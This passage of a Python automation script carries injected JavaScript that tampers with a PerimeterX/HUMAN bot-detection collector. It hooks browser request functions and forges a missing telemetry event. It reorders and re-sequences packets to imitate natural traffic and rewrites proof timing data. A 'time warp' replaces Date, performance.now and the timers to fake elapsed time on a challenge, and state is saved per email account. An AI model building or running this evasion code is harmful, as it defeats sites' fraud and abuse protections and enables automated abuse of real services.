      let u0Body = encodeCollectorPayload(u0Parsed, body);
      u0Body = setFormField(u0Body, "seq", seq);
      if (Number.isFinite(rsc)) u0Body = setFormField(u0Body, "rsc", rsc);
      state.syntheticU0ByQi = state.syntheticU0ByQi || {};
      state.syntheticU0ByQi[qi] = jsonClone(u0.d);
      state.u0SeenByQi[qi] = jsonClone(u0.d);
      state.syntheticU0SeqPolicyByQi = state.syntheticU0SeqPolicyByQi || {};
      state.syntheticU0SeqPolicyByQi[qi] = {
        u0Seq: seq,
        u0Rsc: Number.isFinite(rsc) ? rsc : null,
        finalSeq,
        finalRsc: Number.isFinite(finalRsc) ? finalRsc : null,
        bumpFinalAndLater: !finalAlreadyReservedU0Slot
      };
      state.seqBumpByQi = state.seqBumpByQi || {};
      if (finalAlreadyReservedU0Slot) {
        try { delete state.seqBumpByQi[qi]; } catch (_) { state.seqBumpByQi[qi] = null; }
      } else {
        state.seqBumpByQi[qi] = { fromSeq: seq, delta: 1 };
      }
      state.syntheticU0SentByQi[qi] = true;
      dumpCollectorBody("synthetic_u0_body", u0Body, { url, qi, tags: ["U0MpSRYiJH8="], seq, rsc });
      push("synthetic_u0_send_start", {
        url,
        qi,
        seq,
        rsc,
        finalSeq,
        finalRsc,
        bumpFinalAndLater: !finalAlreadyReservedU0Slot,
        hu: u0.d["HUlnQ1slanM="],
        r3: u0.d["R3c9PQEXNg8="],
        qs: u0.d["QS07ZwRKPlU="]
      });
      try {
        const absUrl = String(url || "").startsWith("//") ? location.protocol + String(url || "") : String(url || "");
        const resp = await fetch(absUrl, {
          method: "POST",
          credentials: "include",
          mode: "cors",
          keepalive: true,
          headers: { "content-type": "application/x-www-form-urlencoded" },
          body: u0Body
        });
        push("synthetic_u0_send_done", { qi, status: resp && resp.status, ok: resp && resp.ok });
      } catch (e) {
        push("synthetic_u0_send_error", { qi, error: String(e && e.message || e) });
      }
      await new Promise(resolve => REAL_SET_TIMEOUT(resolve, 180));
      return true;
    } catch (e) {
      push("synthetic_u0_error", { qi: wait && wait.qi, error: String(e && e.message || e) });
      return false;
    }
  }
  async function maybeNormalizeCollectorRequestBodyAsync(body, url) {
    const wait = shouldWaitForExactFinalKnp(body, url);
    if (!wait) return maybeNormalizeCollectorRequestBody(body, url);
    try {
      state.lastCollectorBody = body;
      state.knpMetaByQi = state.knpMetaByQi || {};
      const form = parseRawForm(body);
      state.knpMetaByQi[wait.qi] = {
        uuid: form.uuid || "",
        appId: form.appId || "PXzC5j78di"
      };
      if (!wait.alreadyExact) {
        startKnpSandboxProbe(wait.qi);
        requestTopKnpSandbox(wait.qi);
      }
      // Send the missing U0 as soon as the raw final proof packet is intercepted.
      // Waiting for exact Knp first can push the U0 fetch past the challenge
      // iframe's failure/close window; the final proof still waits below, but
      // the sequence now matches natural traffic earlier: U0 -> final -> W0.
      const u0SendPromise = maybeSendSyntheticU0BeforeFinal(wait, body, url);
      // Start the lead cap immediately when U0 starts, not after exact Knp
      // completes.  Otherwise exact wait + lead wait can overrun the iframe's
      // close window when the synthetic U0 fetch hangs or fails.
      const u0LeadMs = Math.max(0, Number((AUTO_ACTIONS && AUTO_ACTIONS.syntheticU0LeadMs) || 0));
      const u0GatePromise = u0LeadMs > 0
        ? Promise.race([
            u0SendPromise.then(() => true).catch(() => false),
            new Promise(resolve => REAL_SET_TIMEOUT(() => resolve(false), u0LeadMs))
          ])
        : null;
      push("exact_knp_wait_start", {
        qi: wait.qi,
        waitMs: wait.waitMs,
        requestedWaitMs: wait.requestedWaitMs,
        tags: wait.tags,
        alreadyExact: !!wait.alreadyExact,
        fallbackReady: !!wait.fallbackReady
      });
      const ok = wait.alreadyExact ? true : await waitForExactKnp(wait.qi, wait.waitMs);
      push("exact_knp_wait_done", { qi: wait.qi, ok, hasExact: hasExactKnpForQi(wait.qi) });
      if (!ok && hasFallbackKnpForQi(wait.qi)) {
        state.allowFinalKnpFallbackByQi = state.allowFinalKnpFallbackByQi || {};
        state.allowFinalKnpFallbackByQi[wait.qi] = true;
        push("exact_knp_wait_fallback_enabled", {
          qi: wait.qi,
          sourceQi: (state.fallbackKnpSourceQiByQi && state.fallbackKnpSourceQiByQi[wait.qi]) || state.lastKnpQi || "",
          hadBroadcastFallback: !!(state.fallbackKnpByQi && state.fallbackKnpByQi[wait.qi])
        });
      }
      // Calling maybeSendSyntheticU0BeforeFinal() starts the fetch immediately.
      // By default we wait for its response, matching the accepted trace where
      // U0 is acknowledged before W0/final.  A positive syntheticU0LeadMs can be
      // used as an experimental cap, but the safe path is full U0 ack.
      let u0Settled = false;
      try {
        if (u0LeadMs > 0) {
          u0Settled = await u0GatePromise;
        } else {
          await u0SendPromise;
          u0Settled = true;
        }
      } catch (_) {}
      push("synthetic_u0_lead_wait_done", { qi: wait.qi, leadMs: u0LeadMs, settled: !!u0Settled });
    } catch (e) {
      push("exact_knp_wait_error", { qi: wait && wait.qi, error: String(e && e.message || e) });
    }
    return maybeNormalizeCollectorRequestBody(body, url);
  }
  function maybeNormalizeCollectorRequestBody(body, url) {
    try {
      if (!AUTO_ACTIONS || (!AUTO_ACTIONS.normalizePx1200Timing && !AUTO_ACTIONS.replacePx561FromPx1200 && !AUTO_ACTIONS.alignPx561TimingFromPx1200 && !AUTO_ACTIONS.injectKnpSandboxEvent)) return body;
      if (typeof body !== "string" || body.indexOf("payload=") < 0) return body;
      if (!/collector-.*hsprotect\.net/.test(String(url || ""))) return body;
      if (body.indexOf("appId=PXzC5j78di") < 0) return body;
      state.lastCollectorBody = body;
      const parsed = decodeCollectorPayload(body);
      rememberCollectorQi(parsed.qi, "normalize");
      let changed = false;
      cacheU0FromExistingPayload(parsed.events, parsed.qi);
      if (normalizeKnpEventScope(parsed.events)) changed = true;
      if (normalizeFinalProofEnvelope(parsed.events)) changed = true;
      if (normalizeProbeGlobalLeaks(parsed.events)) changed = true;
      cacheKnpFromExistingPayload(parsed.events, parsed.qi);
      if (injectKnpSandboxEvent(parsed.events, parsed.qi)) changed = true;
      if (normalizeKnpEventScope(parsed.events)) changed = true;
      if (normalizeFinalProofEnvelope(parsed.events)) changed = true;
      if (normalizeProbeGlobalLeaks(parsed.events)) changed = true;
      if (applySyntheticU0FinalShift(parsed.events, parsed.qi)) changed = true;
      if (removeSyntheticU0Bfa(parsed.events, parsed.qi)) changed = true;
      if (normalizeKnpEventScope(parsed.events)) changed = true;
      if (normalizeFinalProofEnvelope(parsed.events)) changed = true;
      if (normalizeProbeGlobalLeaks(parsed.events)) changed = true;
      if (replacePx561FromCachedPx1200(parsed.events)) changed = true;
      if (alignPx561TimingFromCachedPx1200(parsed.events)) changed = true;
      if (normalizeKnpEventScope(parsed.events)) changed = true;
      if (normalizeFinalProofEnvelope(parsed.events)) changed = true;
      if (normalizeProbeGlobalLeaks(parsed.events)) changed = true;
      if (AUTO_ACTIONS.normalizePx1200Timing) {
        for (const ev of parsed.events || []) {
          const d = ev && ev.d;
          if (normalizeProofDataInPayload(d, parsed.qi)) changed = true;
        }
      }
      if (normalizeProofErrorStacks(parsed.events)) changed = true;
      if (normalizeProbeGlobalLeaks(parsed.events)) changed = true;
      if (alignPx561TimingFromCachedPx1200(parsed.events)) changed = true;
      if (normalizeSyntheticU0ProofTimingFields(parsed.events, parsed.qi)) changed = true;
      if (normalizeProofErrorStacks(parsed.events)) changed = true;
      if (normalizeFinalProofEnvelope(parsed.events)) changed = true;
      if (normalizeProbeGlobalLeaks(parsed.events)) changed = true;
      let out = body;
      if (changed) {
        out = encodeCollectorPayload(parsed, body);
        push("collector_request_normalized", { url, oldLen: body.length, newLen: out.length });
      }
      out = maybeApplySeqBump(out, parsed.qi);
      return out;
    } catch (e) {
      push("collector_request_normalize_error", { url, error: String(e && e.message || e) });
      return body;
    }
  }

  try {
    const descText = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, "responseText");
    const descResp = Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype, "response");
    const patchedText = new WeakMap();

    function maybePatchOrLog(xhr) {
      const meta = xhr.__pxProbeMeta || {};
      const url = String(meta.url || "");
      if (!/collector-.*hsprotect\.net/.test(url)) return;
      let original = "";
      try { original = descText && descText.get ? descText.get.call(xhr) : xhr.responseText; } catch (_) {}
      if (!original) return;
      const decoded = decodeCommandBody(original, meta.body);
      if (decoded) {
        try {
          const score1 = (decoded.commands || []).some(c => String(c.preview || "").startsWith("IoIoIo|score|1|"));
          if (score1) {
            window.__pxProbeScore1Detected = {
              t: Date.now(),
              perf: (typeof performance !== "undefined" && performance.now) ? performance.now() : 0,
              url,
              sentLen: meta.body ? String(meta.body).length : 0
            };
            push("collector_score1_detected", window.__pxProbeScore1Detected);
          }
        } catch (_) {}
        push("collector_response", {
          method: meta.method,
          url,
          sentLen: meta.body ? String(meta.body).length : 0,
          decoded
        });
      }
    }

    if (descText && descText.get && descText.configurable) {
      Object.defineProperty(XMLHttpRequest.prototype, "responseText", {
        configurable: true,
        enumerable: descText.enumerable,
        get: function() {
          const p = patchedText.get(this);
          if (p !== undefined) return p;
          return descText.get.call(this);
        }
      });
    }
    if (descResp && descResp.get && descResp.configurable) {
      Object.defineProperty(XMLHttpRequest.prototype, "response", {
        configurable: true,
        enumerable: descResp.enumerable,
        get: function() {
          const p = patchedText.get(this);
          if (p !== undefined) return p;
          return descResp.get.call(this);
        }
      });
    }

    const origOpen = XMLHttpRequest.prototype.open;
    const origSend = XMLHttpRequest.prototype.send;
    function isCollectorBody(body, url) {
      return typeof body === "string"
        && body.indexOf("payload=") >= 0
        && /collector-.*hsprotect\.net/.test(String(url || ""))
        && body.indexOf("appId=PXzC5j78di") >= 0;
    }
    function flushDelayedCollectorQueue() {
      try {
        const q = state.delayedCollectorQueue || [];
        state.delayedCollectorQueue = [];
        state.delayedCollectorSendActive = false;
        if (!q.length) return;
        push("xhr_delayed_queue_flush", { count: q.length });
        for (const item of q) {
          try {
            const out = maybeNormalizeCollectorRequestBody(item.body, item.url);
            const info = collectorBodySeqInfo(out);
            const gate = info.qi && state.lastDelayedFinalByQi && state.lastDelayedFinalByQi[info.qi];
            if (gate && Number.isFinite(info.seq) && Number.isFinite(gate.seq) && info.seq <= gate.seq) {
              push("xhr_delayed_queue_drop_stale", {
                url: item.url,
                qi: info.qi,
                seq: info.seq,
                rsc: info.rsc,
                finalSeq: gate.seq,
                finalRsc: gate.rsc,
                tags: info.tags,
                finalTags: gate.tags
              });
              continue;
            }
            item.xhr.__pxProbeMeta = item.xhr.__pxProbeMeta || {};
            item.xhr.__pxProbeMeta.body = typeof out === "string" ? out : "";
            push("xhr_delayed_queue_send_now", { url: item.url, len: typeof out === "string" ? out.length : null });
            origSend.call(item.xhr, out);
          } catch (e) {
            push("xhr_delayed_queue_send_error", { url: item && item.url, error: String(e && e.message || e) });
          }
        }
      } catch (e) {
        push("xhr_delayed_queue_flush_error", { error: String(e && e.message || e) });
        state.delayedCollectorSendActive = false;
      }
    }
    function sendOrDropQueuedCollectorItem(item, reason) {
      try {
        let out = maybeNormalizeCollectorRequestBody(item.body, item.url);
        let info = collectorBodySeqInfo(out);
        const gate = info.qi && state.lastDelayedFinalByQi && state.lastDelayedFinalByQi[info.qi];
        if (gate && Number.isFinite(info.seq) && Number.isFinite(gate.seq) && info.seq <= gate.seq) {
          if (
            info.tags && info.tags.indexOf("W0cqQR4rLnA=") >= 0 &&
            info.tags.indexOf("PX561") < 0 &&
            typeof out === "string"
          ) {
            const newSeq = Math.max(0, Math.round(gate.seq + 1));
            const newRsc = Number.isFinite(gate.rsc) ? Math.max(0, Math.round(gate.rsc + 1)) : null;
            out = setFormField(out, "seq", newSeq);
            if (newRsc !== null) out = setFormField(out, "rsc", newRsc);
            info = collectorBodySeqInfo(out);
            push("xhr_delayed_queue_bump_stale_w0", {
              url: item.url,
              reason,
              qi: info.qi,
              oldSeq: item.seq,
              oldRsc: item.rsc,
              newSeq,
              newRsc,
              finalSeq: gate.seq,
              finalRsc: gate.rsc,
              tags: info.tags
            });
          } else {
          push("xhr_delayed_queue_drop_stale", {
            url: item.url,
            reason,
            qi: info.qi,
            seq: info.seq,
            rsc: info.rsc,
            finalSeq: gate.seq,
            finalRsc: gate.rsc,
            tags: info.tags,
            finalTags: gate.tags
          });
          return false;
          }
        }
        item.xhr.__pxProbeMeta = item.xhr.__pxProbeMeta || {};
        item.xhr.__pxProbeMeta.body = typeof out === "string" ? out : "";
        push("xhr_delayed_queue_send_now", {
          url: item.url,
          reason,
          qi: info.qi,
          seq: info.seq,
          rsc: info.rsc,
          len: typeof out === "string" ? out.length : null
        });
        origSend.call(item.xhr, out);
        return true;
      } catch (e) {
        push("xhr_delayed_queue_send_error", { url: item && item.url, reason, error: String(e && e.message || e) });
        return false;
      }
    }
    function drainEarlyW0Queue(qi, reason) {
      try {
        qi = String(qi || "");
        const map = state.earlyW0QueueByQi || {};
        const q = qi ? (map[qi] || []) : [];
        if (!q.length) return;
        map[qi] = [];
        push("xhr_early_w0_queue_drain", { qi, reason, count: q.length });
        for (const item of q) sendOrDropQueuedCollectorItem(item, reason || "early_w0_drain");
      } catch (e) {
        push("xhr_early_w0_queue_drain_error", { qi, reason, error: String(e && e.message || e) });
      }
    }
    function maybeHoldEarlyW0(xhr, body, url) {
      try {
        if (!isCollectorBody(body, url)) return false;
        const info = collectorBodySeqInfo(body);
        if (!info.qi || info.qi === "1604064986000") return false;
        if (info.tags.indexOf("W0cqQR4rLnA=") < 0 || info.tags.indexOf("PX561") >= 0) return false;
        const gate = state.lastDelayedFinalByQi && state.lastDelayedFinalByQi[info.qi];
        if (gate) {
          if (Number.isFinite(info.seq) && Number.isFinite(gate.seq) && info.seq <= gate.seq) {
            push("xhr_early_w0_drop_after_final", {
              url,
              qi: info.qi,
              seq: info.seq,
              rsc: info.rsc,
              finalSeq: gate.seq,
              finalRsc: gate.rsc,
              tags: info.tags,
              finalTags: gate.tags
            });
            return true;
          }
          return false;
        }
        state.earlyW0QueueByQi = state.earlyW0QueueByQi || {};
        state.earlyW0QueueByQi[info.qi] = state.earlyW0QueueByQi[info.qi] || [];
        const item = { xhr, body, url, qi: info.qi, seq: info.seq, rsc: info.rsc };
        state.earlyW0QueueByQi[info.qi].push(item);
        const holdMs = Math.max(1200, Number((AUTO_ACTIONS && AUTO_ACTIONS.earlyW0HoldMs) || 6500));
        push("xhr_early_w0_held_for_final", {
          url,
          qi: info.qi,
          seq: info.seq,
          rsc: info.rsc,
          holdMs,
          queueLen: state.earlyW0QueueByQi[info.qi].length,
          tags: info.tags
        });
        REAL_SET_TIMEOUT(() => {
          try {
            const q = state.earlyW0QueueByQi && state.earlyW0QueueByQi[info.qi];
            if (!q || q.indexOf(item) < 0) return;
            q.splice(q.indexOf(item), 1);
            push("xhr_early_w0_hold_timeout", { url, qi: info.qi, seq: info.seq, rsc: info.rsc });
            sendOrDropQueuedCollectorItem(item, "early_w0_hold_timeout");
          } catch (e) {
            push("xhr_early_w0_timeout_error", { url, qi: info.qi, error: String(e && e.message || e) });
          }
        }, holdMs);
        return true;
      } catch (e) {
        push("xhr_early_w0_hold_error", { url, error: String(e && e.message || e) });
        return false;
      }
    }
    function maybeSendPendingBeforeFinalW0(xhr, body, url) {
      try {
        if (!isCollectorBody(body, url)) return false;
        const info = collectorBodySeqInfo(body);
        if (!info.qi || info.qi === "1604064986000") return false;
        if (info.tags.indexOf("W0cqQR4rLnA=") < 0 || info.tags.indexOf("PX561") >= 0) return false;
        const pending = state.pendingBeforeFinalByQi && state.pendingBeforeFinalByQi[info.qi];
        if (!pending) return false;
        const nowMs = Date.now();
        if (Number.isFinite(pending.untilMs) && nowMs > pending.untilMs) {
          try { delete state.pendingBeforeFinalByQi[info.qi]; } catch (_) {}
          return false;
        }
        let out = maybeNormalizeCollectorRequestBody(body, url);
        xhr.__pxProbeMeta = xhr.__pxProbeMeta || {};
        xhr.__pxProbeMeta.body = typeof out === "string" ? out : "";
        push("xhr_pending_before_final_w0_send_now", {
          url,
          qi: info.qi,
          seq: info.seq,
          rsc: info.rsc,
          finalSeq: pending.finalSeq,
          finalRsc: pending.finalRsc,
          finalDelayMs: pending.finalDelayMs,
          tags: info.tags,
          len: typeof out === "string" ? out.length : null
        });
        origSend.call(xhr, out);
        return true;
      } catch (e) {
        push("xhr_pending_before_final_w0_error", { url, error: String(e && e.message || e) });
        return false;
      }
    }
    XMLHttpRequest.prototype.open = function(method, url, ...rest) {
      this.__pxProbeMeta = { method, url: String(url || "") };
      return origOpen.call(this, method, url, ...rest);
    };
    XMLHttpRequest.prototype.send = function(body) {
      let sendBody = body;
      try {
        this.__pxProbeMeta = this.__pxProbeMeta || {};
        const xhr = this;
        const url = this.__pxProbeMeta.url;
        this.addEventListener("loadend", () => maybePatchOrLog(this));
        if (maybeHoldEarlyW0(xhr, body, url)) return;
        if (maybeSendPendingBeforeFinalW0(xhr, body, url)) return;
        if (state.delayedCollectorSendActive && isCollectorBody(body, url)) {
          state.delayedCollectorQueue = state.delayedCollectorQueue || [];
          state.delayedCollectorQueue.push({ xhr, body, url });
          push("xhr_send_queued_behind_delayed_final", { url, len: body.length, queueLen: state.delayedCollectorQueue.length });
          return;
        }
        const delayInfo = typeof body === "string" ? shouldWaitForExactFinalKnp(body, url) : null;
        if (delayInfo) {
          push("xhr_send_delayed_for_exact_knp", { url, len: body.length, qi: delayInfo.qi, waitMs: delayInfo.waitMs });
          state.delayedCollectorSendActive = true;
          dumpCollectorBody("xhr_delayed_for_exact_knp_raw", body, {
            url,
            qi: delayInfo.qi,
            waitMs: delayInfo.waitMs,
            tags: delayInfo.tags
          });
          let delayedSent = false;
          let delayedQueueFlushed = false;
          const flushQueueOnce = () => {
            if (delayedQueueFlushed) return;
            delayedQueueFlushed = true;
            flushDelayedCollectorQueue();
          };
          const finishDelayedSend = (out, reason) => {
            if (delayedSent) return;
            delayedSent = true;
            try {
              xhr.__pxProbeMeta = xhr.__pxProbeMeta || {};
              xhr.__pxProbeMeta.body = typeof out === "string" ? out : "";
            } catch (_) {}
            try {
              push("xhr_delayed_send_now", { url, reason, len: typeof out === "string" ? out.length : null });
              if (typeof out === "string") {
                dumpCollectorBody("xhr_delayed_send_body", out, {
                  url,
                  qi: delayInfo.qi,
                  reason,
                  tags: delayInfo.tags
                });
              }
              const finalInfo = typeof out === "string" ? rememberDelayedFinalSent(out, reason) : null;
              const beforeFinalRaw = Number((AUTO_ACTIONS && AUTO_ACTIONS.earlyW0DrainBeforeFinalMs));
              const beforeFinalEnabled = finalInfo && finalInfo.qi && Number.isFinite(beforeFinalRaw) && beforeFinalRaw >= 0;
              const sendFinalNow = () => {
                try {
                  try {
                    xhr.addEventListener("loadend", () => REAL_SET_TIMEOUT(flushQueueOnce, 80), { once: true });
                  } catch (_) {}
                  origSend.call(xhr, out);
                  if (finalInfo && finalInfo.qi && !beforeFinalEnabled) {
                    const drainDelay = Math.max(0, Number((AUTO_ACTIONS && AUTO_ACTIONS.earlyW0DrainAfterFinalMs) || 0));
                    push("xhr_early_w0_drain_scheduled_after_final", { qi: finalInfo.qi, delayMs: drainDelay, reason });
                    REAL_SET_TIMEOUT(() => drainEarlyW0Queue(finalInfo.qi, "final_sent_after_final"), drainDelay);
                  }
                  REAL_SET_TIMEOUT(flushQueueOnce, 2800);
                } catch (e) {
                  push("xhr_delayed_send_error", { url, reason: reason + "_send_final_now", error: String(e && e.message || e) });
                  flushQueueOnce();
                }
              };
              if (beforeFinalEnabled) {
                const finalDelay = Math.max(0, beforeFinalRaw);
                push("xhr_early_w0_drain_scheduled_before_final", { qi: finalInfo.qi, finalDelayMs: finalDelay, reason });
                try {
                  state.pendingBeforeFinalByQi = state.pendingBeforeFinalByQi || {};
                  state.pendingBeforeFinalByQi[finalInfo.qi] = {
                    finalSeq: finalInfo.seq,
                    finalRsc: finalInfo.rsc,
                    finalDelayMs: finalDelay,
                    untilMs: Date.now() + Math.max(500, finalDelay + 600),
                    reason
                  };
                } catch (_) {}
                drainEarlyW0Queue(finalInfo.qi, "before_final");
                const clearPendingAndSend = () => {
                  try {
                    if (state.pendingBeforeFinalByQi) delete state.pendingBeforeFinalByQi[finalInfo.qi];
                  } catch (_) {}
                  sendFinalNow();
                };
                if (finalDelay <= 0) clearPendingAndSend();
                else REAL_SET_TIMEOUT(clearPendingAndSend, finalDelay);
              } else {
                sendFinalNow();
              }
            } catch (e) {
              push("xhr_delayed_send_error", { url, reason, error: String(e && e.message || e) });
              flushQueueOnce();
            }
          };
          const hardExtraMs = Math.max(900, Number((AUTO_ACTIONS && AUTO_ACTIONS.delayedFinalHardExtraMs) || 3000));
          const hardTimer = REAL_SET_TIMEOUT(() => {
            try {
              push("xhr_delayed_hard_timeout", { url, qi: delayInfo.qi, waitMs: delayInfo.waitMs, hardExtraMs });
              if (hasFallbackKnpForQi(delayInfo.qi)) {
                state.allowFinalKnpFallbackByQi = state.allowFinalKnpFallbackByQi || {};
                state.allowFinalKnpFallbackByQi[delayInfo.qi] = true;
                push("xhr_delayed_hard_timeout_fallback_enabled", { qi: delayInfo.qi });
              }
              finishDelayedSend(maybeNormalizeCollectorRequestBody(body, url), "hard_timeout");
            } catch (e) {
              push("xhr_delayed_hard_timeout_error", { url, error: String(e && e.message || e) });
              finishDelayedSend(body, "hard_timeout_raw");
            }
          }, Math.max(800, Number(delayInfo.waitMs || 0) + hardExtraMs));
          maybeNormalizeCollectorRequestBodyAsync(body, url).then(out => {
            try { REAL_CLEAR_TIMEOUT(hardTimer); } catch (_) {}
            finishDelayedSend(out, "async_done");
          }).catch(e => {
            try { REAL_CLEAR_TIMEOUT(hardTimer); } catch (_) {}
            push("xhr_delayed_normalize_error", { url, error: String(e && e.message || e) });
            finishDelayedSend(body, "async_error_raw");
          });
          return;
        }
        if (typeof body === "string") {
          sendBody = maybeNormalizeCollectorRequestBody(body, url);
          const finalInfo = typeof sendBody === "string" ? rememberDelayedFinalSent(sendBody, "normal_send") : null;
          if (finalInfo && finalInfo.qi) drainEarlyW0Queue(finalInfo.qi, "normal_final_sent");
        }
        this.__pxProbeMeta.body = typeof sendBody === "string" ? sendBody : "";
      } catch (_) {}
      return origSend.call(this, sendBody);
    };
    push("xhr_hook_installed", {});
  } catch (e) {
    push("xhr_hook_error", { error: String(e && e.message || e) });
  }

  try {
    const origDispatch = EventTarget.prototype.dispatchEvent;
    EventTarget.prototype.dispatchEvent = function(ev) {
      try {
        if (ev && ev.detail && (ev.detail.captchaToken !== undefined || ev.detail.appID || ev.detail.status !== undefined)) {
          push("dispatch_event", { type: ev.type, detail: ev.detail });
        }
      } catch (_) {}
      return origDispatch.call(this, ev);
    };
    push("dispatch_hook_installed", {});
  } catch (e) {
    push("dispatch_hook_error", { error: String(e && e.message || e) });
  }
  try {
    if (AUTO_ACTIONS && AUTO_ACTIONS.exposeTestNormalizer) {
      window.__pxProbeNormalizeBodyForTest = maybeNormalizeCollectorRequestBody;
      window.__pxProbeDecodeBodyForTest = decodeCollectorPayload;
    }
  } catch (_) {}
})();
"""


LATE_TIME_WARP_JS = r"""
(() => {
  if (window.__pxLateTimeWarpInstalled) return;
  Object.defineProperty(window, "__pxLateTimeWarpInstalled", { value: true });
  const OrigDate = Date;
  const origDateNow = OrigDate.now.bind(OrigDate);
  const origPerfNow = performance && performance.now ? performance.now.bind(performance) : null;
  const origSetTimeout = window.setTimeout.bind(window);
  const origSetInterval = window.setInterval.bind(window);
  const origRAF = window.requestAnimationFrame ? window.requestAnimationFrame.bind(window) : null;
  const origEventTimeStampDesc = (typeof Event !== "undefined" && Event.prototype)
    ? Object.getOwnPropertyDescriptor(Event.prototype, "timeStamp")
    : null;
  let warp = null;
  function record(kind, data) {
    try {
      const s = window.__pxProbe;
      if (s && s.events) {
        s.events.push({ t: origDateNow(), perf: realPerf(), href: location.href, kind, data });
        if (s.events.length > 1500) s.events.splice(0, s.events.length - 1500);
      }
    } catch (_) {}
  }
  function realPerf() {
    try { return origPerfNow ? origPerfNow() : origDateNow(); } catch (_) { return origDateNow(); }
  }
  function fakeDelta() {
    if (!warp) return null;
    return warp.offsetMs + (realPerf() - warp.realStartPerf) * warp.factor;
  }
  function fakeEpoch() {
    const d = fakeDelta();
    return d === null ? origDateNow() : warp.realStartEpoch + d;
  }
  function fakePerfNow() {
    const d = fakeDelta();
    return d === null ? realPerf() : warp.fakeStartPerf + d;
  }
  function startWarp(reason, targetOverride, wallOverride) {
    const targetMs = Math.max(1000, Number(targetOverride || 11800));
    const wallMs = Math.max(20, Number(wallOverride || 180));
    warp = {
      reason: reason || "late",
      realStartPerf: realPerf(),
      realStartEpoch: origDateNow(),
      fakeStartPerf: realPerf(),
      factor: targetMs / wallMs,
      offsetMs: 0
    };
    record("late_time_warp_start", { reason: warp.reason, factor: warp.factor, targetMs, wallMs });
  }
  function stopWarpLater(reason, stopDelay) {
    const delay = Math.max(0, Number(stopDelay || 250));
    origSetTimeout(() => {
      try {
        if (warp) record("late_time_warp_stop", { reason: reason || "late", fakeElapsed: fakeDelta() });
      } catch (_) {}
      warp = null;
    }, delay);
  }
  function FakeDate(...args) {
    if (this instanceof FakeDate) {
      return args.length ? new OrigDate(...args) : new OrigDate(fakeEpoch());
    }
    return args.length ? OrigDate(...args) : new OrigDate(fakeEpoch()).toString();
  }
  try {
    Object.setPrototypeOf(FakeDate, OrigDate);
    FakeDate.prototype = OrigDate.prototype;
    FakeDate.now = fakeEpoch;
    FakeDate.UTC = OrigDate.UTC;
    FakeDate.parse = OrigDate.parse;
    window.Date = FakeDate;
  } catch (_) {}
  try {
    if (performance && origPerfNow) {
      Object.defineProperty(performance, "now", { configurable: true, value: fakePerfNow });
    }
  } catch (_) {}
  try {
    if (typeof Event !== "undefined" && Event.prototype) {
      Object.defineProperty(Event.prototype, "timeStamp", {
        configurable: true,
        get: function() {
          try {
            if (warp) return fakePerfNow();
            if (origEventTimeStampDesc && typeof origEventTimeStampDesc.get === "function") {
              return origEventTimeStampDesc.get.call(this);
            }
            if (origEventTimeStampDesc && "value" in origEventTimeStampDesc) return origEventTimeStampDesc.value;
          } catch (_) {}
          return realPerf();
        }
      });
    }
  } catch (_) {}
  try {
    window.setTimeout = function(cb, delay, ...args) {
      let d = Number(delay);
      if (warp && isFinite(d) && d > 0) d = Math.max(0, d / Math.max(1, warp.factor));
      return origSetTimeout(cb, d, ...args);
    };
    window.setInterval = function(cb, delay, ...args) {
      let d = Number(delay);
      if (warp && isFinite(d) && d > 0) d = Math.max(1, d / Math.max(1, warp.factor));
      return origSetInterval(cb, d, ...args);
    };
    if (origRAF) {
      window.requestAnimationFrame = function(cb) {
        return origRAF(function() {
          try { return cb(fakePerfNow()); } catch (e) { throw e; }
        });
      };
    }
  } catch (_) {}
  Object.defineProperty(window, "__pxProbeTimeWarpStart", { configurable: true, writable: true, value: startWarp });
  Object.defineProperty(window, "__pxProbeTimeWarpStop", { configurable: true, writable: true, value: stopWarpLater });
  Object.defineProperty(window, "__pxProbeTimeWarpState", {
    configurable: true,
    writable: true,
    value: () => ({ active: !!warp, fakeElapsed: fakeDelta(), factor: warp && warp.factor, reason: warp && warp.reason })
  });
  window.addEventListener("message", ev => {
    try {
      const cmd = ev && ev.data && ev.data.__pxProbeTimeWarpCommand;
      if (!cmd) return;
      if (cmd.action === "start") startWarp(cmd.reason || "late_message_start", cmd.holdMs, cmd.wallMs);
      else if (cmd.action === "stop") stopWarpLater(cmd.reason || "late_message_stop", cmd.stopDelayMs);
    } catch (_) {}
  });
  record("late_time_warp_installed", {});
})();
"""


def build_runtime_hook_js(auto_actions=None):
    spec = auto_actions or {"enabled": False}
    return RUNTIME_HOOK_JS.replace(
        "__PXPROBE_AUTO_ACTIONS__",
        json.dumps(spec, ensure_ascii=False),
    )


def safe_email_for_filename(email):
    return (email or "unknown").replace("@", "_").replace(":", "_").replace("\\", "_").replace("/", "_")


def collect_probe_state(page):
    frames = []
    for idx, frame in enumerate(page.frames):
        try:
            frames.append(frame.evaluate(
                """() => {
                    function fromWindowName() {
                      try {
                        if (typeof window.name === 'string' && window.name.startsWith('__PXPROBE__')) {
                          return JSON.parse(window.name.slice('__PXPROBE__'.length));
                        }
                      } catch (_) {}
                      return null;
                    }
                    const ownStringKeys = obj => {
                      try { return Reflect.ownKeys(obj).filter(k => typeof k === 'string'); } catch (_) {}
                      try { return Object.getOwnPropertyNames(obj); } catch (_) {}
                      return [];
                    };
                    const pxFunctionKeys = obj => {
                      try { return ownStringKeys(obj).filter(k => /^PX\\d+$/.test(k) && typeof obj[k] === 'function'); } catch (_) {}
                      return [];
                    };
                    const seen = new Set();
                    const namespaces = [];
                    for (const ns of ownStringKeys(window)) {
                      let obj = null;
                      try { obj = window[ns]; } catch (_) { continue; }
                      if (!obj || (typeof obj !== 'object' && typeof obj !== 'function')) continue;
                      if (/^_?PX/i.test(ns) || ns === 'PX' || /PXzC5j78di/i.test(ns) || pxFunctionKeys(obj).length) {
                        if (!seen.has(ns)) {
                          seen.add(ns);
                          namespaces.push({ ns, keys: ownStringKeys(obj).filter(k => /^PX\\d+$/.test(k)).sort() });
                        }
                      }
                    }
                    const winPx = pxFunctionKeys(window);
                    if (winPx.length) namespaces.push({ ns: '__window__', keys: winPx.sort() });
                    return {
                      url: location.href,
                      namespaces,
                      probe: window.__pxProbe || fromWindowName(),
                      title: document.title || ''
                    };
                }"""
            ))
        except Exception as exc:
            frames.append({"index": idx, "error": repr(exc)})
    return frames


def save_probe_state(page, out_dir, email, mode, suffix="final"):
    out_dir.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path = out_dir / f"{stamp}_{safe_email_for_filename(email)}_{mode}_{suffix}.json"
    data = {
        "saved_at": datetime.now().isoformat(),
        "mode": mode,
        "email": email,
